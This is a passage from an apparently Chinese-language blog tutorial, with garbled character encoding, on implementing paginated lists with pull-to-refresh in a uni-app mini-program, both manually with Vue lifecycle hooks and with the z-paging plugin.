        <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"picInfo"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"picTitle"</span>&gt;</span>{{ item.name }}<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"picNum"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mr-20"</span>&gt;</span>{{ item.videoNum }}è§†é¢‘<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{{ item.pictureNum }}å›¾ç‰‡<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
      <span class="hljs-comment">&lt;!-- åŠ è½½çŠ¶æ€ --&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"loading-status"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">van-loading</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"loading"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"spinner"</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"32rpx"</span>&gt;</span> åŠ è½½ä¸­... <span class="hljs-tag">&lt;/<span class="hljs-name">van-loading</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">v-else-if</span>=<span class="hljs-string">"!hasMore &amp;&amp; downloadClassList.length &gt; 0"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"no-more"</span>&gt;</span> - æ²¡æœ‰æ›´å¤šäº† - <span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"null-page"</span> <span class="hljs-attr">v-else</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">van-empty</span> <span class="hljs-attr">description</span>=<span class="hljs-string">"æš‚æ— æ•°æ®"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted, ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> { queryDownload } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/downloadHistory.js'</span>;
<span class="hljs-keyword">import</span> { onShow } <span class="hljs-keyword">from</span> <span class="hljs-string">'@dcloudio/uni-app'</span>;
<span class="hljs-keyword">import</span> { onReachBottom, onPullDownRefresh } <span class="hljs-keyword">from</span> <span class="hljs-string">'@dcloudio/uni-app'</span>;

<span class="hljs-keyword">const</span> resourceClass = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>);

<span class="hljs-keyword">const</span> option1 = <span class="hljs-title function_">ref</span>([
  { <span class="hljs-attr">text</span>: <span class="hljs-string">'å…¨éƒ¨è®°å½•'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">''</span> },
  { <span class="hljs-attr">text</span>: <span class="hljs-string">'æ–‡æ—…æ™¯åŒº'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'scenic'</span> },
  { <span class="hljs-attr">text</span>: <span class="hljs-string">'ä½“è‚²èµ›äº‹'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'event'</span> },
]);

<span class="hljs-keyword">const</span> page = <span class="hljs-title function_">ref</span>(<span class="hljs-number">1</span>); <span class="hljs-comment">// è¡¨ç¤ºä¸‹ä¸€æ¬¡è¦è¯·æ±‚çš„é¡µç ï¼Œåˆå§‹è¯·æ±‚ä¸º 1</span>
<span class="hljs-keyword">const</span> pageSize = <span class="hljs-number">10</span>;
<span class="hljs-keyword">const</span> loading = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>);
<span class="hljs-keyword">const</span> hasMore = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">true</span>);
<span class="hljs-keyword">const</span> total = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">const</span> downloadClassList = <span class="hljs-title function_">ref</span>([]);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">selectClass</span>(<span class="hljs-params">event</span>) {
  downloadClassList.<span class="hljs-property">value</span> = [];
  resourceClass.<span class="hljs-property">value</span> = event.<span class="hljs-property">detail</span>;
  <span class="hljs-title function_">loadMore</span>();
}

<span class="hljs-comment">// å‰å¾€ä¸‹è½½åˆ—è¡¨</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">toDownloadList</span>(<span class="hljs-params">item</span>) {
  uni.<span class="hljs-title function_">navigateTo</span>({
    <span class="hljs-attr">url</span>: <span class="hljs-string">'/pages/downloadList/index'</span>,
    <span class="hljs-attr">success</span>: <span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
      res.<span class="hljs-property">eventChannel</span>.<span class="hljs-title function_">emit</span>(<span class="hljs-string">'recordFolder'</span>, item);
    },
  });
}

<span class="hljs-comment">// loadMoreï¼šrefresh ä¸º true æ—¶è¡¨ç¤ºä¸‹æ‹‰åˆ·æ–°/é‡æ–°åŠ è½½ç¬¬ä¸€é¡µ</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadMore</span>(<span class="hljs-params">refresh = <span class="hljs-literal">false</span></span>) {
  <span class="hljs-comment">// å¹¶å‘ä¿æŠ¤ï¼ˆé˜²æ­¢é‡å¤è¯·æ±‚ï¼‰</span>
  <span class="hljs-keyword">if</span> (loading.<span class="hljs-property">value</span>) <span class="hljs-keyword">return</span>;
  loading.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>;

  <span class="hljs-keyword">const</span> token = uni.<span class="hljs-title function_">getStorageSync</span>(<span class="hljs-string">'token'</span>);
  <span class="hljs-keyword">if</span> (!token) {
    loading.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
    uni.<span class="hljs-title function_">navigateTo</span>({ <span class="hljs-attr">url</span>: <span class="hljs-string">'/pages/loginPage/index'</span> });
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">if</span> (refresh) {
      <span class="hljs-comment">// è¯·æ±‚ç¬¬ä¸€é¡µ</span>
      <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">queryDownload</span>(
        {
          <span class="hljs-attr">originType</span>: resourceClass.<span class="hljs-property">value</span>,
          <span class="hljs-attr">pageNum</span>: <span class="hljs-number">1</span>,
          pageSize,
        },
        token
      );

      <span class="hljs-comment">// è¦†ç›–æ•°æ®</span>
      downloadClassList.<span class="hljs-property">value</span> = res.<span class="hljs-property">rows</span> || [];
      total.<span class="hljs-property">value</span> = res.<span class="hljs-property">total</span> || (res.<span class="hljs-property">rows</span> ? res.<span class="hljs-property">rows</span>.<span class="hljs-property">length</span> : <span class="hljs-number">0</span>);

      <span class="hljs-comment">// å¦‚æœè¿”å›çš„è¡Œæ•°å°äº pageSizeï¼Œè¯´æ˜æ²¡æœ‰æ›´å¤š</span>
      hasMore.<span class="hljs-property">value</span> = downloadClassList.<span class="hljs-property">value</span>.<span class="hljs-property">length</span> &lt; total.<span class="hljs-property">value</span>;

      <span class="hljs-comment">// é‡è¦ï¼šrefresh åæŠŠ page è®¾ä¸ºä¸‹ä¸€é¡µï¼ˆ2ï¼‰</span>
      page.<span class="hljs-property">value</span> = <span class="hljs-number">2</span>;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// éåˆ·æ–°åœºæ™¯ï¼Œè¯·æ±‚ pageï¼ˆpage è¡¨ç¤ºä¸‹ä¸€æ¬¡è¦è¯·æ±‚çš„é¡µç ï¼‰</span>
      <span class="hljs-keyword">if</span> (!hasMore.<span class="hljs-property">value</span>) {
        loading.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">return</span>;
      }

      <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">queryDownload</span>(
        {
          <span class="hljs-attr">originType</span>: resourceClass.<span class="hljs-property">value</span>,
          <span class="hljs-attr">pageNum</span>: page.<span class="hljs-property">value</span>,
          pageSize,
        },
        token
      );

      <span class="hljs-keyword">const</span> rows = res.<span class="hljs-property">rows</span> || [];

      <span class="hljs-comment">// è¿½åŠ æ•°æ®</span>
      downloadClassList.<span class="hljs-property">value</span> = [...downloadClassList.<span class="hljs-property">value</span>, ...rows];
      total.<span class="hljs-property">value</span> = res.<span class="hljs-property">total</span> || total.<span class="hljs-property">value</span>;

      <span class="hljs-comment">// æˆåŠŸè¿½åŠ åï¼Œpage è‡ªå¢ä¸ºä¸‹ä¸€æ¬¡è¦è¯·æ±‚çš„é¡µç </span>
      page.<span class="hljs-property">value</span> = page.<span class="hljs-property">value</span> + <span class="hljs-number">1</span>;

      <span class="hljs-comment">// å¦‚æœæœ¬æ¬¡è¿”å›çš„æ•°é‡ &lt; pageSize æˆ– å½“å‰é•¿åº¦ &gt;= totalï¼Œåˆ™æ²¡æœ‰æ›´å¤š</span>
      <span class="hljs-keyword">if</span> (rows.<span class="hljs-property">length</span> &lt; pageSize || downloadClassList.<span class="hljs-property">value</span>.<span class="hljs-property">length</span> &gt;= total.<span class="hljs-property">value</span>) {
        hasMore.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
      } <span class="hljs-keyword">else</span> {
        hasMore.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>;
      }
    }
  } <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'loadMore error'</span>, err);
    <span class="hljs-comment">// è¯·æ±‚å¤±è´¥æ—¶ä¸æ”¹å˜ pageï¼ˆé¿å…ä¹±è·³ï¼‰ï¼Œå¹¶å¯è§†éœ€è¦è®¾ç½® hasMore / æ˜¾ç¤ºé”™è¯¯</span>
  } <span class="hljs-keyword">finally</span> {
    loading.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
  }
}

<span class="hljs-comment">// ä¸‹æ‹‰åˆ·æ–°ï¼šè°ƒç”¨ loadMore(true)ï¼Œå¹¶ç­‰å¾…å®Œæˆå†åœæ­¢åˆ·æ–°åŠ¨ç”»</span>
<span class="hljs-title function_">onPullDownRefresh</span>(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">if</span> (loading.<span class="hljs-property">value</span>) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// é¿å…åŒæ—¶ä¸‹æ‹‰å’Œè§¦åº•å¹¶å‘</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'pull down refresh'</span>);
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">loadMore</span>(<span class="hljs-literal">true</span>);
  <span class="hljs-comment">// ç»“æŸä¸‹æ‹‰åŠ¨ç”»</span>
  uni.<span class="hljs-title function_">stopPullDownRefresh</span>();
});

<span class="hljs-comment">// è§¦åº•åŠ è½½ï¼šawait loadMore()ï¼Œå¹¶ä¾èµ– hasMore æ§åˆ¶</span>
<span class="hljs-title function_">onReachBottom</span>(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-comment">// é˜²æ­¢é‡å¤è§¦å‘</span>
  <span class="hljs-keyword">if</span> (loading.<span class="hljs-property">value</span> || !hasMore.<span class="hljs-property">value</span>) <span class="hljs-keyword">return</span>;

  <span class="hljs-keyword">await</span> <span class="hljs-title function_">loadMore</span>(<span class="hljs-literal">false</span>);
});
<span class="hljs-comment">// domæŒ‚è½½åŠ è½½ä¸€æ¬¡</span>
<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// getDownload();</span>
});
<span class="hljs-comment">// æ¯æ¬¡è¿›å…¥é¡µé¢åŠ è½½ä¸€æ¬¡</span>
<span class="hljs-title function_">onShow</span>(<span class="hljs-function">() =&gt;</span> {
  downloadClassList.<span class="hljs-property">value</span> = [];
  page.<span class="hljs-property">value</span> = <span class="hljs-number">1</span>;
  <span class="hljs-title function_">loadMore</span>();
});
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"scss"</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.downloadHistory</span> {
  <span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>;
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f5f5f5</span>;
}

<span class="hljs-selector-class">.topSearch</span> {
  <span class="hljs-attribute">position</span>: fixed;
  <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">right</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">99</span>;
}

<span class="hljs-selector-class">.downloadCollection</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">30</span>rpx;
  <span class="hljs-attribute">padding-top</span>: <span class="hljs-number">130</span>rpx;
}

<span class="hljs-selector-class">.downloadCard</span> {
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fff</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8</span>rpx;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">30</span>rpx;
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">justify-content</span>: flex-start;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">30</span>rpx;
}

<span class="hljs-selector-class">.downloadCard</span><span class="hljs-selector-pseudo">:last-child</span> {
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">0</span>;
}

<span class="hljs-selector-class">.picInfo</span> {
  <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">20</span>rpx;
}

<span class="hljs-selector-class">.picTitle</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">30</span>rpx;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">50</span>rpx;
}

<span class="hljs-selector-class">.picNum</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">28</span>rpx;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#666</span>;
}

<span class="hljs-selector-class">.mr-20</span> {
  <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">20</span>rpx;
}

<span class="hljs-selector-class">.loading-status</span> {
  <span class="hljs-attribute">text-align</span>: center;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">40</span>rpx <span class="hljs-number">0</span>;
}
<span class="hljs-selector-class">.no-more</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">24</span>rpx;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#999</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>


</code></pre>
<h2 data-id="heading-5">äºŒ.åˆ©ç”¨æ’ä»¶<code>z-paging</code></h2>
<h3 data-id="heading-6">1.å‰æ</h3>
<ul>
<li>éœ€è¦"enablePullDownRefresh": false</li>
</ul>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"path"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"pages/downloadHistory/index"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"style"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"navigationBarTitleText"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ä¸‹è½½è®°å½•"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"enablePullDownRefresh"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
</code></pre>
<p><strong>z-paging` ä¸ä½¿ç”¨å°ç¨‹åºåŸç”Ÿä¸‹æ‹‰åˆ·æ–°ï¼Œå®ƒè‡ªå·±å°è£…äº†ä¸€æ•´å¥—åˆ·æ–°ä¸åˆ†é¡µé€»è¾‘</strong></p>
<ul>
<li>ä¸‹æ‹‰åˆ·æ–°</li>
<li>ä¸Šæ‹‰åŠ è½½æ›´å¤š</li>
<li>æ»šåŠ¨ç›‘å¬</li>
<li>åŠ è½½çŠ¶æ€ç®¡ç†</li>
<li>ç©ºæ•°æ®æç¤º</li>
<li>è‡ªåŠ¨è§¦åº•åŠ è½½</li>
</ul>
<p>æ‰€ä»¥ä¸éœ€è¦å†ç”¨åŸç”Ÿçš„ä¸‹æ‹‰åˆ·æ–°ï¼Œå¦åˆ™å¯èƒ½ä¼šå†²çªã€‚</p>
<p><strong><code>z-paging</code> è‡ªå·±ç›‘å¬ <code>scroll-view</code>ï¼Œä¸ä¾èµ–é¡µé¢èƒ½åŠ›</strong></p>
<p><code>z-paging </code>é€šè¿‡å†…éƒ¨çš„ï¼š</p>
<ul>
<li><code>scroll-view</code></li>
<li><code>custom-refresher</code></li>
<li>è‡ªå®šä¹‰â€œä¸‹æ‹‰åˆ·æ–°åŠ¨ç”»â€</li>
</ul>
<p>æ¥å®ç°åˆ·æ–°æ•ˆæœï¼Œè€Œä¸æ˜¯ä¾èµ–å¾®ä¿¡æä¾›çš„é¡µé¢çº§ <code>enablePullDownRefresh</code>ã€‚</p>
<p>æ‰€ä»¥ç”¨ <code>z-paging</code> æ—¶ï¼Œ<code>pages.json </code>ä¸­å®Œå…¨ä¸éœ€è¦å¼€å¯æ­¤é¡¹ã€‚</p>
<h3 data-id="heading-7">2.ä¼˜ç‚¹</h3>
<ul>
<li>ä½¿ç”¨ç®€å•ï¼Œé‡‡ç”¨vueç»„ä»¶çš„æ–¹å¼ï¼Œé€šè¿‡<code>props</code> <code>event</code> <code>slot</code>æ¥å¿«é€Ÿæ„å»º</li>
<li><code>z-paging </code>ä¸ä½¿ç”¨é¡µé¢çš„ä¸‹æ‹‰åˆ·æ–°èƒ½åŠ›ï¼ˆ<code>enablePullDownRefresh</code>ï¼‰</li>
</ul>
<h3 data-id="heading-8">3.å®ç°åŸç†</h3>
<p><code>z-paging </code>ä½¿ç”¨çš„æ˜¯ <strong>ç»„ä»¶å†…éƒ¨ scroll-view çš„ä¸‹æ‹‰åˆ·æ–°èƒ½åŠ›</strong>ï¼Œ å†…éƒ¨ç±»ä¼¼è¿™æ ·ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">scroll-view</span>
  <span class="hljs-attr">scroll-y</span>
  <span class="hljs-attr">:refresher-enabled</span>=<span class="hljs-string">"useRefresher"</span>
  <span class="hljs-attr">:lower-threshold</span>=<span class="hljs-string">"50"</span>
  @<span class="hljs-attr">refresherrefresh</span>=<span class="hljs-string">"onRefresh"</span>
  @<span class="hljs-attr">scrolltolower</span>=<span class="hljs-string">"onLoadMore"</span>
&gt;</span>
  <span class="hljs-comment">&lt;!-- é¡¶éƒ¨ slot --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"top"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span>

  <span class="hljs-comment">&lt;!-- åˆ—è¡¨å†…å®¹ --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">slot</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span>

  <span class="hljs-comment">&lt;!-- loading åŠ¨ç”» --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">loading-view</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"loading"</span> /&gt;</span>

  <span class="hljs-comment">&lt;!-- æ²¡æœ‰æ›´å¤š --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">no-more</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"!hasMore"</span> /&gt;</span>
  
   <span class="hljs-comment">&lt;!-- ...æ›´å¤šæ’æ§½ --&gt;</span>
   
<span class="hljs-tag">&lt;/<span class="hljs-name">scroll-view</span>&gt;</span>

</code></pre>
<h3 data-id="heading-9">4.å…·ä½“ä»£ç å®ç°</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"downloadHistory"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"downloadCollection"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">z-paging</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"paging"</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"dataList"</span> @<span class="hljs-attr">query</span>=<span class="hljs-string">"queryList"</span> <span class="hljs-attr">:default-page-size</span>=<span class="hljs-string">"10"</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- éœ€è¦å›ºå®šåœ¨é¡¶éƒ¨ä¸æ»šåŠ¨çš„viewæ”¾åœ¨slot="top"çš„viewä¸­ï¼Œå¦‚æœéœ€è¦è·Ÿç€æ»šåŠ¨ï¼Œåˆ™ä¸è¦è®¾ç½®slot="top" --&gt;</span>
        <span class="hljs-comment">&lt;!-- æ³¨æ„ï¼æ­¤å¤„çš„z-tabsä¸ºç‹¬ç«‹çš„ç»„ä»¶ï¼Œå¯æ›¿æ¢ä¸ºç¬¬ä¸‰æ–¹çš„tabsï¼Œè‹¥éœ€è¦ä½¿ç”¨z-tabsï¼Œè¯·åœ¨æ’ä»¶å¸‚åœºæœç´¢z-tabså¹¶å¼•å…¥ï¼Œå¦åˆ™ä¼šæŠ¥æ’ä»¶æ‰¾ä¸åˆ°çš„é”™è¯¯ --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">top</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">view</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">van-dropdown-menu</span> <span class="hljs-attr">active-color</span>=<span class="hljs-string">"#29a1f7"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">van-dropdown-item</span> <span class="hljs-attr">:value</span>=<span class="hljs-string">"resourceClass"</span> <span class="hljs-attr">:options</span>=<span class="hljs-string">"option1"</span> @<span class="hljs-attr">change</span>=<span class="hljs-string">"selectClass"</span> /&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">van-dropdown-menu</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- è®¾ç½®è‡ªå·±çš„emptyç»„ä»¶ï¼Œéå¿…é¡»ã€‚ç©ºæ•°æ®æ—¶ä¼šè‡ªåŠ¨å±•ç¤ºç©ºæ•°æ®ç»„ä»¶ï¼Œä¸éœ€è¦è‡ªå·±å¤„ç† --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">empty</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">van-empty</span> <span class="hljs-attr">description</span>=<span class="hljs-string">"æš‚æ— æ•°æ®"</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- è‡ªå®šä¹‰çš„æ²¡æœ‰æ›´å¤šæ•°æ®view --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">loadingMoreNoMore</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"no-more"</span>&gt;</span>- æ²¡æœ‰æ›´å¤šäº† -<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"downloadCard"</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(item, key) in dataList"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"key"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"toDownloadList(item)"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">van-image</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"100"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"75"</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">"item.coverUrl"</span> /&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"picInfo"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"picTitle"</span>&gt;</span>{{ item.name }}<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"picNum"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mr-20"</span>&gt;</span>{{ item.videoNum }}è§†é¢‘<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{{ item.pictureNum }}å›¾ç‰‡<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">z-paging</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> { queryDownload } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/downloadHistory.js'</span>;
<span class="hljs-keyword">const</span> paging = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>);
<span class="hljs-keyword">const</span> dataList = <span class="hljs-title function_">ref</span>([]);

<span class="hljs-keyword">const</span> resourceClass = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>);

<span class="hljs-keyword">const</span> option1 = <span class="hljs-title function_">ref</span>([
  { <span class="hljs-attr">text</span>: <span class="hljs-string">'å…¨éƒ¨è®°å½•'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">''</span> },
  { <span class="hljs-attr">text</span>: <span class="hljs-string">'æ–‡æ—…æ™¯åŒº'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'scenic'</span> },
  { <span class="hljs-attr">text</span>: <span class="hljs-string">'ä½“è‚²èµ›äº‹'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'event'</span> },
]);

<span class="hljs-comment">// @queryæ‰€ç»‘å®šçš„æ–¹æ³•ä¸è¦è‡ªå·±è°ƒç”¨ï¼ï¼éœ€è¦åˆ·æ–°åˆ—è¡¨æ•°æ®æ—¶ï¼Œåªéœ€è¦è°ƒç”¨paging.value.reload()å³å¯</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">queryList</span> = (<span class="hljs-params">pageNo, pageSize</span>) =&gt; {
  <span class="hljs-comment">// ç»„ä»¶åŠ è½½æ—¶ä¼šè‡ªåŠ¨è§¦å‘æ­¤æ–¹æ³•ï¼Œå› æ­¤é»˜è®¤é¡µé¢åŠ è½½æ—¶ä¼šè‡ªåŠ¨è§¦å‘ï¼Œæ— éœ€æ‰‹åŠ¨è°ƒç”¨</span>
  <span class="hljs-comment">// è¿™é‡Œçš„pageNoå’ŒpageSizeä¼šè‡ªåŠ¨è®¡ç®—å¥½ï¼Œç›´æ¥ä¼ ç»™æœåŠ¡å™¨å³å¯</span>
  <span class="hljs-keyword">const</span> params = {
